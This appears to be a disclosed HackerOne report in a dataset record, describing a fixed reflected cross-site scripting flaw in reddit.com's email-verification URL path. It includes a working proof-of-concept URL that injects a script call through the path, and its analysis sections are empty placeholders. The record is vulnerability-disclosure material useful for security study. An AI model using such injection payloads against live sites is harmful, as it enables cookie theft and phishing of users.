---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1051373'
original_report_id: '1051373'
title: XSS Reflected on reddit.com via url path
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: reddit
created_at: '2020-12-05T21:47:05.077Z'
disclosed_at: '2022-09-27T16:04:21.641Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 144
asset_identifier: www.reddit.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected on reddit.com via url path

## Metadata

- HackerOne Report ID: 1051373
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: reddit
- Disclosed At: 2022-09-27T16:04:21.641Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi I found a XSS-R

To reproduce the issue please click the poc link and then press the "verify email" button

PoC:

https://www.reddit.com/verification/asd',%20alert(document.location),%20%27

## Impact

With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
It is also possible to inject html thus modifying the original page

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
